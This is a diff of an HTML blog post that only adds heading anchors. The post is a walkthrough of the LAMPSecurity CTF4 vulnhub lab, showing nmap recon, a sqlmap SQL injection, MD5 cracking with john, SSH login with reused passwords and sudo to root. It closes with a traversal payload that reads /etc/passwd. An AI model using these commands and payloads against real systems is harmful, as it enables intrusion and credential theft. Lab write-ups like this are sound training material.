@@ -97,12 +97,12 @@
             <p>I start the LAMPSecurity CTF4 challenge of vulnhub
 <a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/">available here</a>.
 The goal is to get a root shell on the server.</p>
-<h1>Discovery</h1>
+<h1 id="discovery">Discovery</h1>
 <p>First of all we need to determine the IP address of the server.
 Since we launch it in a bridged virtual machine the local router got the IP
 address in the DHCP logs. We simply found the most recent one. For me it is
 <code>192.168.1.56</code>.</p>
-<h2>Nmap</h2>
+<h2 id="nmap">Nmap</h2>
 <p>Let start with a simple nmap</p>
 <div class="highlight"><pre><span class="code-line"><span></span>#<span class="nv">nmap</span> <span class="o">-</span><span class="nv">A</span> <span class="o">-</span><span class="nv">oA</span> <span class="nv">ctf4</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">56</span></span>
 <span class="code-line"><span class="nv">Nmap</span> <span class="mi">6</span>.<span class="mi">47</span> <span class="nv">scan</span> <span class="nv">initiated</span> <span class="nv">Thu</span> <span class="nv">Aug</span> <span class="mi">28</span> <span class="mi">18</span>:<span class="mi">49</span>:<span class="mi">49</span> <span class="mi">2014</span> <span class="nv">as</span>: <span class="nv">nmap</span> <span class="o">-</span><span class="nv">A</span> <span class="o">-</span><span class="nv">oA</span> <span class="nv">ctf4</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">56</span></span>
@@ -136,13 +136,13 @@ address in the DHCP logs. We simply found the most recent one. For me it is
 <li>a web service on port 80, note that there is five disallowed entries in robots.txt</li>
 <li>and a close CUPS service on port 631.</li>
 </ul>
-<h2>The website</h2>
+<h2 id="the-website">The website</h2>
 <p>Let's take a look at the web site. It is a simple blog site with a XSS flaw on
 the search engine.</p>
 <p>The article are indexed with a GET parameter id. This parameter is vulnerable to
 an SQL injection.</p>
-<h1>Exploitation</h1>
-<h2>Sqlmap</h2>
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="sqlmap">Sqlmap</h2>
 <p>We launch sqlmap:</p>
 <div class="highlight"><pre><span class="code-line"><span></span>#<span class="nv">sqlmap</span> <span class="o">-</span><span class="nv">u</span> <span class="s1">&#39;</span><span class="s">http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6</span><span class="s1">&#39;</span> <span class="o">-</span><span class="nv">p</span> <span class="nv">id</span> <span class="o">--</span><span class="nv">tables</span></span>
 <span class="code-line">  <span class="nv">sqlmap</span> <span class="nv">identified</span> <span class="nv">the</span> <span class="nv">following</span> <span class="nv">injection</span> <span class="nv">points</span> <span class="nv">with</span> <span class="nv">a</span> <span class="nv">total</span> <span class="nv">of</span> <span class="mi">0</span> <span class="nv">HTTP</span><span class="ss">(</span><span class="nv">s</span><span class="ss">)</span> <span class="nv">requests</span>:</span>
@@ -256,7 +256,7 @@ an SQL injection.</p>
 </pre></div>
 
 
-<h2>Cracking the hashes</h2>
+<h2 id="cracking-the-hashes">Cracking the hashes</h2>
 <p>We save the hahses in a file (option proposed by sqlmap) and we launch john the
 ripper on it:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><span class="o">#</span><span class="n">john</span> <span class="n">hashes</span> <span class="c1">--format=raw-md5</span></span>
@@ -279,7 +279,7 @@ undone9999. We cracked an other password:</p>
 </pre></div>
 
 
-<h2>SSH connexions</h2>
+<h2 id="ssh-connexions">SSH connexions</h2>
 <p>Okay the same password seems to be used everywhere and I was a bit lost to how
 to continue so I try the credentials on the ssh service: <em>it works!</em></p>
 <p>First of all I logged with the jdurbin account.
@@ -287,13 +287,13 @@ There seems to be anything useful but in my search I saw that achen had an
 ssh private key readable by everyone (a ppk one for PuTTY).
 Okay lets use it to connect on the machine. It ask no password and we got a
 shell, what now?</p>
-<h2>Privileges escalation</h2>
+<h2 id="privileges-escalation">Privileges escalation</h2>
 <p>I try to see what was the differences with this account and I saw a pdf file
 "linux_administration.pdf" so I tried to use the sudo command with <code>sudo -v</code> and
 once again: <em>it works!</em>
 So a simple <code>sudo su</code> give us the root rights.</p>
 <p><em>DONE!</em></p>
-<h1>Summary</h1>
+<h1 id="summary">Summary</h1>
 <p>Lets resume :</p>
 <ol>
 <li>exploitation of the SQL injection</li>
@@ -304,7 +304,7 @@ So a simple <code>sudo su</code> give us the root rights.</p>
 <li>sudo su</li>
 </ol>
 <p>That was a easy one !</p>
-<h1>Nota bene</h1>
+<h1 id="nota-bene">Nota bene</h1>
 <p>Oh yeah we do not explore the lead of the file injection in the
 page GET parameter:</p>
 <div class="highlight"><pre><span class="code-line"><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">56</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">html</span><span class="o">?</span><span class="n">page</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="o">%</span><span class="mi">00</span><span class="o">&amp;</span><span class="n">title</span><span class="o">=</span><span class="n">Blog</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">5</span></span>
